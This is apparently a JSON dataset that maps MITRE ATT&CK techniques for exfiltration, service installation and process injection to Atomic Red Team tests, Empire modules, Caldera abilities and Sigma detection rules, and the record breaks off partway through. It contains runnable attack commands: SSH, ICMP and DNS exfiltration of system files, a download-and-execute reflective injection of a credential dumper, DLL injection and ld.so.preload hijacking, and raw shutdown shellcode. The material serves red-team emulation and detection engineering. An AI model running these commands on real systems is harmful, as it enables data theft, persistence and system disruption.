"https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "exfiltration/Invoke_ExfilDataToGitHub", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "exfiltration/Invoke_ExfilDataToGitHub", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Exfiltration Over Alternative Protocol": {"attack_technique": "T1048", "display_name": "Exfiltration Over Alternative Protocol", "atomic_tests": [{"name": "Exfiltration Over Alternative Protocol - SSH", "description": "Input a domain and test Exfiltration over SSH\n\nRemote to Local\n\nUpon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"domain": {"description": "target SSH domain", "type": "url", "default": "target.example.com"}}, "executor": {"name": "sh", "elevation_required": false, "command": "ssh #{domain} \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz\n"}}, {"name": "Exfiltration Over Alternative Protocol - SSH", "description": "Input a domain and test Exfiltration over SSH\n\nLocal to Remote\n\nUpon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"domain": {"description": "target SSH domain", "type": "url", "default": "target.example.com"}, "user_name": {"description": "username for domain", "type": "string", "default": "atomic"}, "password": {"description": "password for user", "type": "string", "default": "atomic"}}, "executor": {"name": "sh", "elevation_required": false, "command": "tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'\n"}}, {"name": "Exfiltration Over Alternative Protocol - HTTP", "description": "A firewall rule (iptables or firewalld) will be needed to allow exfiltration on port 1337.\n\nUpon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded.\n", "supported_platforms": ["macos", "linux"], "executor": {"name": "manual", "steps": "1. Victim System Configuration:\n\n    mkdir /tmp/victim-staging-area\n    echo \"this file will be exfiltrated\" > /tmp/victim-staging-area/victim-file.txt\n\n2. Using Python to establish a one-line HTTP server on victim system:\n\n    cd /tmp/victim-staging-area\n    python -m SimpleHTTPServer 1337\n\n3. To retrieve the data from an adversary system:\n\n    wget http://VICTIM_IP:1337/victim-file.txt\n"}}, {"name": "Exfiltration Over Alternative Protocol - ICMP", "description": "Exfiltration of specified file over ICMP protocol.\n\nUpon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.\n", "supported_platforms": ["windows"], "input_arguments": {"input_file": {"description": "Path to file to be exfiltrated.", "type": "Path", "default": "C:\\Windows\\System32\\notepad.exe"}, "ip_address": {"description": "Destination IP address where the data should be sent.", "type": "String", "default": "127.0.0.1"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"#{ip_address}\", 1500, $Data) }\n"}}, {"name": "Exfiltration Over Alternative Protocol - DNS", "description": "Exfiltration of specified file over DNS protocol.\n", "supported_platforms": ["linux"], "executor": {"name": "manual", "steps": "1. On the adversary machine run the below command.\n\n    tshark -f \"udp port 53\" -Y \"dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches \".domain\"\" >> received_data.txt\n\n2. On the victim machine run the below commands.\n\n    xxd -p input_file > encoded_data.hex | for data in `cat encoded_data.hex`; do dig $data.domain; done\n    \n3. Once the data is received, use the below command to recover the data.\n\n    cat output_file | cut -d \"A\" -f 2 | cut -d \" \" -f 2 | cut -d \".\" -f 1 | sort | uniq | xxd -p -r\n"}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/exfiltration/exfil_dropbox", "ATT&CK Technique #1": "T1048", "ATT&CK Technique #2": "T1071", "Technique": "Exfiltration Over Alternative Protocol", "Concatenate for Python Dictionary": "\"powershell/exfiltration/exfil_dropbox\":  [\"T1048\",\"T1071\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "exfiltration/Invoke_ExfilDataToGitHub", "ATT&CK Technique #1": "T1048", "ATT&CK Technique #2": "", "Technique": "Exfiltration Over Alternative Protocol", "Concatenate for Python Dictionary": "\"exfiltration/Invoke_ExfilDataToGitHub\":  [\"T1048\"],"}}], "command_list": ["ssh target.example.com \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz\n", "tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@target.example.com 'cat > /Users.tar.gz.enc'\n", "tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh atomic@#{domain} 'cat > /Users.tar.gz.enc'\n", "tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'\n", "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\\Windows\\System32\\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send(\"#{ip_address}\", 1500, $Data) }\n", "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"127.0.0.1\", 1500, $Data) }\n", "powershell/exfiltration/exfil_dropbox", "powershell/exfiltration/exfil_dropbox", "exfiltration/Invoke_ExfilDataToGitHub", "exfiltration/Invoke_ExfilDataToGitHub"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1050", "commands": [{"source": "atomics/T1050/T1050.yaml", "command": "sc.exe create #{service_name} binPath= PathToAtomicsFolder\\T1050\\bin\\AtomicService.exe\nsc.exe start #{service_name}\n", "name": null}, {"source": "atomics/T1050/T1050.yaml", "command": "sc.exe create AtomicTestService binPath= #{binary_path}\nsc.exe start AtomicTestService\n", "name": null}, {"source": "atomics/T1050/T1050.yaml", "command": "New-Service -Name \"#{service_name}\" -BinaryPathName \"PathToAtomicsFolder\\T1050\\bin\\AtomicService.exe\"\nStart-Service -Name \"#{service_name}\"\n", "name": null}, {"source": "atomics/T1050/T1050.yaml", "command": "New-Service -Name \"AtomicTestService\" -BinaryPathName \"#{binary_path}\"\nStart-Service -Name \"AtomicTestService\"\n", "name": null}, {"source": "Threat Hunting Tables", "command": "*.exe (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "\\AppData\\*", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "HKCU\\software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "*.exe (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "$Recycle.bin\\*", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "*.exe (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "Temp\\*", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "*.exe (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "Users\\Public\\*", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "*.exe (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "Users\\Default\\*", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "*.exe (query|add)", "name": null}, {"source": "Threat Hunting Tables", "command": "HKEY_USERS\\*\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand", "name": "registry_path"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/service_exe_restore", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/service_exe_restore", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/service_exe_stager", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/service_exe_stager", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/service_exe_useradd", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/service_exe_useradd", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/service_stager", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/powerup/service_stager", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Service Installation": {"attack_technique": "T1050", "display_name": "Service Installation", "atomic_tests": [{"name": "Service Installation CMD", "description": "Download an executable from github and start it as a service.\n\nUpon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.\n", "supported_platforms": ["windows"], "input_arguments": {"binary_path": {"description": "Name of the service binary, include path.", "type": "Path", "default": "PathToAtomicsFolder\\T1050\\bin\\AtomicService.exe"}, "service_name": {"description": "Name of the Service", "type": "String", "default": "AtomicTestService"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Service binary must exist on disk at specified location (#{binary_path})\n", "prereq_command": "if (Test-Path #{binary_path}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{binary_path}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1050/bin/AtomicService.exe\" -OutFile \"#{binary_path}\"\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "sc.exe create #{service_name} binPath= #{binary_path}\nsc.exe start #{service_name}\n", "cleanup_command": "sc.exe stop #{service_name} >nul 2>&1\nsc.exe delete #{service_name} >nul 2>&1\n"}}, {"name": "Service Installation PowerShell", "description": "Installs A Local Service via PowerShell.\n\nUpon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will be displayed.\n", "supported_platforms": ["windows"], "input_arguments": {"binary_path": {"description": "Name of the service binary, include path.", "type": "Path", "default": "PathToAtomicsFolder\\T1050\\bin\\AtomicService.exe"}, "service_name": {"description": "Name of the Service", "type": "String", "default": "AtomicTestService"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Service binary must exist on disk at specified location (#{binary_path})\n", "prereq_command": "if (Test-Path #{binary_path}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{binary_path}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1050/bin/AtomicService.exe\" -OutFile \"#{binary_path}\"\n"}], "executor": {"name": "powershell", "elevation_required": true, "command": "New-Service -Name \"#{service_name}\" -BinaryPathName \"#{binary_path}\"\nStart-Service -Name \"#{service_name}\"\n", "cleanup_command": "Stop-Service -Name \"#{service_name}\" 2>&1 | Out-Null\ntry {(Get-WmiObject Win32_Service -filter \"name='#{service_name}'\").Delete()}\ncatch {}\n"}}]}}, {"Threat Hunting Tables": {"chain_id": "100109", "os": "windows", "parent_process": "*.exe", "commandline_string": "(query|add)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKCU\\software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "registry_value": "", "file_path": "\\AppData\\*", "file_value": "", "frequency": "high", "mitre_caption": "new_service", "mitre_attack": "T1050", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100110", "os": "windows", "parent_process": "*.exe", "commandline_string": "(query|add)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "registry_value": "", "file_path": "$Recycle.bin\\*", "file_value": "", "frequency": "rare", "mitre_caption": "new_service", "mitre_attack": "T1050", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100111", "os": "windows", "parent_process": "*.exe", "commandline_string": "(query|add)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "registry_value": "", "file_path": "Temp\\*", "file_value": "", "frequency": "high", "mitre_caption": "new_service", "mitre_attack": "T1050", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100112", "os": "windows", "parent_process": "*.exe", "commandline_string": "(query|add)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "registry_value": "", "file_path": "Users\\Public\\*", "file_value": "", "frequency": "high", "mitre_caption": "new_service", "mitre_attack": "T1050", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100113", "os": "windows", "parent_process": "*.exe", "commandline_string": "(query|add)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "registry_value": "", "file_path": "Users\\Default\\*", "file_value": "", "frequency": "high", "mitre_caption": "new_service", "mitre_attack": "T1050", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100114", "os": "windows", "parent_process": "*.exe", "commandline_string": "(query|add)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "HKEY_USERS\\*\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "new_service", "mitre_attack": "T1050", "itw_sample": "https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/privesc/powerup/service_exe_restore", "ATT&CK Technique #1": "T1050", "ATT&CK Technique #2": "", "Technique": "New Service", "Concatenate for Python Dictionary": "\"powershell/privesc/powerup/service_exe_restore\":  [\"T1050\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/privesc/powerup/service_exe_stager", "ATT&CK Technique #1": "T1050", "ATT&CK Technique #2": "", "Technique": "New Service", "Concatenate for Python Dictionary": "\"powershell/privesc/powerup/service_exe_stager\":  [\"T1050\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/privesc/powerup/service_exe_useradd", "ATT&CK Technique #1": "T1050", "ATT&CK Technique #2": "", "Technique": "New Service", "Concatenate for Python Dictionary": "\"powershell/privesc/powerup/service_exe_useradd\":  [\"T1050\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/privesc/powerup/service_stager", "ATT&CK Technique #1": "T1050", "ATT&CK Technique #2": "", "Technique": "New Service", "Concatenate for Python Dictionary": "\"powershell/privesc/powerup/service_stager\":  [\"T1050\"],"}}], "command_list": ["sc.exe create #{service_name} binPath= PathToAtomicsFolder\\T1050\\bin\\AtomicService.exe\nsc.exe start #{service_name}\n", "sc.exe create AtomicTestService binPath= #{binary_path}\nsc.exe start AtomicTestService\n", "New-Service -Name \"#{service_name}\" -BinaryPathName \"PathToAtomicsFolder\\T1050\\bin\\AtomicService.exe\"\nStart-Service -Name \"#{service_name}\"\n", "New-Service -Name \"AtomicTestService\" -BinaryPathName \"#{binary_path}\"\nStart-Service -Name \"AtomicTestService\"\n", "*.exe (query|add)", "\\AppData\\*", "HKCU\\software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "*.exe (query|add)", "$Recycle.bin\\*", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "*.exe (query|add)", "Temp\\*", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "*.exe (query|add)", "Users\\Public\\*", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "*.exe (query|add)", "Users\\Default\\*", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\*", "*.exe (query|add)", "HKEY_USERS\\*\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand", "powershell/privesc/powerup/service_exe_restore", "powershell/privesc/powerup/service_exe_restore", "powershell/privesc/powerup/service_exe_stager", "powershell/privesc/powerup/service_exe_stager", "powershell/privesc/powerup/service_exe_useradd", "powershell/privesc/powerup/service_exe_useradd", "powershell/privesc/powerup/service_stager", "powershell/privesc/powerup/service_stager"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_path contains \"sc.exe\"or process_path contains \"powershell.exe\"or process_path contains \"cmd.exe\")and (process_command_line contains \"*New-Service*BinaryPathName*\"or process_command_line contains \"*sc*create*binpath*\"or process_command_line contains \"*Get-WmiObject*Win32_Service*create*\")", "name": "New Service Process"}], "possible_detections": [{"data_source": {"action": "global", "title": "APT29 Google Update Service Install", "id": "c069f460-2b87-4010-8dcf-e45bab362624", "description": "This method detects malicious services mentioned in APT29 report by FireEye. The legitimate path for the Google update service is C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe so the service names and executable locations used by APT29 are specific enough to be detected in log files.", "references": ["https://www.fireeye.com/blog/threat-research/2017/03/apt29_domain_frontin.html"], "tags": ["attack.persistence", "attack.g0016", "attack.t1050"], "logsource": {"product": "windows", "service": "system"}, "detection": {"service_install": {"EventID": 7045, "ServiceName": "Google Update"}, "timeframe": "5m", "condition": "service_install | near process"}, "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"logsource": {"category": "process_creation", "product": "windows"}, "detection": {"process": {"Image": ["C:\\Program Files(x86)\\Google\\GoogleService.exe", "C:\\Program Files(x86)\\Google\\GoogleUpdate.exe"]}}}}, {"data_source": {"title": "Turla Service Install", "id": "1df8b3da-b0ac-4d8a-b7c7-6cb7c24160e4", "description": "This method detects a service install of malicious services mentioned in Carbon Paper - Turla report by ESET", "references": ["https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/"], "tags": ["attack.persistence", "attack.g0010", "attack.t1050"], "logsource": {"product": "windows", "service": "system"}, "detection": {"selection": {"EventID": 7045, "ServiceName": ["srservice", "ipvpn", "hkmsvc"]}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "StoneDrill Service Install", "id": "9e987c6c-4c1e-40d8-bd85-dd26fba8fdd6", "description": "This method detects a service install of the malicious Microsoft Network Realtime Inspection Service service described in StoneDrill report by Kaspersky", "author": "Florian Roth", "references": ["https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/"], "tags": ["attack.persistence", "attack.g0064", "attack.t1050"], "logsource": {"product": "windows", "service": "system"}, "detection": {"selection": {"EventID": 7045, "ServiceName": "NtsSrv", "ServiceFileName": "* LocalService"}, "condition": "selection"}, "falsepositives": ["Unlikely"], "level": "high"}}, {"data_source": {"title": "Turla PNG Dropper Service", "id": "1228f8e2-7e79-4dea-b0ad-c91f1d5016c1", "description": "This method detects malicious services mentioned in Turla PNG dropper report by NCC Group in November 2018", "references": ["https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/november/turla-png-dropper-is-back/"], "author": "Florian Roth", "date": "2018/11/23", "tags": ["attack.persistence", "attack.g0010", "attack.t1050"], "logsource": {"product": "windows", "service": "system"}, "detection": {"selection": {"EventID": 7045, "ServiceName": "WerFaultSvc"}, "condition": "selection"}, "falsepositives": ["unlikely"], "level": "critical"}}, {"data_source": {"title": "Suspicious Driver Load from Temp", "id": "2c4523d5-d481-4ed0-8ec3-7fbf0cb41a75", "description": "Detects a driver load from a temporary directory", "author": "Florian Roth", "tags": ["attack.persistence", "attack.t1050"], "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 6, "ImageLoaded": "*\\Temp\\\\*"}, "condition": "selection"}, "falsepositives": ["there is a relevant set of false positives depending on applications in the environment"], "level": "medium"}}, {"data_source": {"title": "Malicious Service Installations", "id": "5a105d34-05fc-401e-8553-272b45c1522d", "description": "Detects known malicious service installs that only appear in cases of lateral movement, credential dumping and other suspicious activity", "author": "Florian Roth", "tags": ["attack.persistence", "attack.privilege_escalation", "attack.t1050", "car.2013-09-005"], "logsource": {"product": "windows", "service": "system"}, "detection": {"selection": {"EventID": 7045}, "malsvc_wce": {"ServiceName": ["WCESERVICE", "WCE SERVICE"]}, "malsvc_paexec": {"ServiceFileName": "*\\PAExec*"}, "malsvc_winexe": {"ServiceFileName": "winexesvc.exe*"}, "malsvc_pwdumpx": {"ServiceFileName": "*\\DumpSvc.exe"}, "malsvc_wannacry": {"ServiceName": "mssecsvc2.0"}, "malsvc_persistence": {"ServiceFileName": "* net user *"}, "malsvc_others": {"ServiceName": ["pwdump*", "gsecdump*", "cachedump*"]}, "condition": "selection and 1 of malsvc_*"}, "falsepositives": ["Penetration testing"], "level": "critical"}}, {"data_source": {"title": "Rare Service Installs", "id": "66bfef30-22a5-4fcd-ad44-8d81e60922ae", "description": "Detects rare service installs that only appear a few times per time frame and could reveal password dumpers, backdoor installs or other types of malicious services", "status": "experimental", "author": "Florian Roth", "tags": ["attack.persistence", "attack.privilege_escalation", "attack.t1050", "car.2013-09-005"], "logsource": {"product": "windows", "service": "system"}, "detection": {"selection": {"EventID": 7045}, "timeframe": "7d", "condition": "selection | count() by ServiceFileName < 5"}, "falsepositives": ["Software installation", "Software updates"], "level": "low"}}]}, {"technique_id": "T1055", "commands": [{"source": "atomics/T1055/T1055.yaml", "command": "$mypid = #{process_id}\nmavinject $mypid /INJECTRUNNING PathToAtomicsFolder\\T1055\\src\\x64\\T1055.dll\n", "name": null}, {"source": "atomics/T1055/T1055.yaml", "command": "$mypid = (get-process spoolsv).id\nmavinject $mypid /INJECTRUNNING #{dll_payload}\n", "name": null}, {"source": "atomics/T1055/T1055.yaml", "command": "sudo sh -c 'echo PathToAtomicsFolder/T1055/bin/T1055.so > /etc/ld.so.preload'\n", "name": null}, {"source": "atomics/T1055/T1055.yaml", "command": "sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'\n", "name": null}, {"source": "atomics/T1055/T1055.yaml", "command": "sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'\n", "name": null}, {"source": "atomics/T1055/T1055.yaml", "command": "LD_PRELOAD=PathToAtomicsFolder/T1055/bin/T1055.so ls\n", "name": null}, {"source": "atomics/T1055/T1055.yaml", "command": "LD_PRELOAD=#{path_to_shared_library} ls\n", "name": null}, {"source": "atomics/T1055/T1055.yaml", "command": ".\\bin\\T1055.exe\n", "name": null}, {"source": "atomics/T1055/T1055.yaml", "command": "copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe\nC:\\svchost.exe /c echo T1055 > \\\\localhost\\c$\\T1055.txt\n", "name": null}, {"source": "data/abilities/credential-access/c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7.yml", "command": {"windows": {"psh": {"command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"file\",\"debugger.dll\");\n$PBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -PBytes $PBytes -verbose"}}}, "name": "Injects cred dumper exe into an available process"}, {"source": "data/abilities/defense-evasion/a398986f-31b0-436a-87e9-c8e82c028f3c.yml", "command": {"windows": {"psh": {"command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"shared.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$PEBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}\n"}}}, "name": "Injects sandcat DLL into an available process"}, {"source": "data/abilities/defense-evasion/a74bc239-a196-4f7e-8d5c-fe8c0266071c.yml", "command": {"windows": {"psh": {"command": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}\n"}}}, "name": "Leverage odbcconf for DLL injection"}, {"source": "data/abilities/defense-evasion/e5bcefee-262d-4568-a261-e8a20855ec81.yml", "command": {"windows": {"psh": {"command": "$explorer = Get-Process -Name explorer;\nmavinject.exe $explorer.id C:\\Users\\Public\\sandcat.dll\n"}}}, "name": "Leverage Mavinject (signed binary) for DLL injection"}, {"source": "data/abilities/privilege-escalation/0821b0b0-7902-4a7b-8052-80bda5a43684.yml", "command": {"linux": {"shellcode_amd64,shellcode_386": {"command": "0x48, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x50, 0x6a, 0x77, 0x66, 0x68, 0x6e, 0x6f, 0x48, 0x89, 0xe3, 0x50, 0x66, 0x68, 0x2d, 0x68, 0x48, 0x89, 0xe1, 0x50, 0x49, 0xb8, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x49, 0xba, 0x73, 0x68, 0x75, 0x74, 0x64, 0x6f, 0x77, 0x6e, 0x41, 0x52, 0x41, 0x50, 0x48, 0x89, 0xe7, 0x52, 0x53, 0x51, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05\n"}}}, "name": "Force shutdown a target system using Process Injection and raw shellcode"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/code_execution/invoke_reflectivepeinjection", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/code_execution/invoke_reflectivepeinjection", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/code_execution/invoke_shellcode", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/code_execution/invoke_shellcode", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/code_execution/invoke_shellcodemsil", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/code_execution/invoke_shellcodemsil", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/credential_injection", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/credential_injection", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/psinject", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/psinject", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/reflective_inject", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/reflective_inject", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/shinject", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/shinject", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/management/osx/shellcodeinject64", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/management/osx/shellcodeinject64", "name": "Empire Module Command"}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "echo #{path_to_shared_library} > /etc/ld.so.preload", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "echo /home/$USER/random.so > /etc/ld.so.preload", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Process Injection": {"attack_technique": "T1055", "display_name": "Process Injection", "atomic_tests": [{"name": "Process Injection via mavinject.exe", "description": "Windows 10 Utility To Inject DLLS.\n\nUpon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.\n", "supported_platforms": ["windows"], "input_arguments": {"dll_payload": {"description": "DLL to Inject", "type": "Path", "default": "PathToAtomicsFolder\\T1055\\src\\x64\\T1055.dll"}, "process_id": {"description": "PID of input_arguments", "type": "Integer", "default": "(get-process spoolsv).id"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Utility to inject must exist on disk at specified location (#{dll_payload})\n", "prereq_command": "if (Test-Path #{dll_payload}) {exit 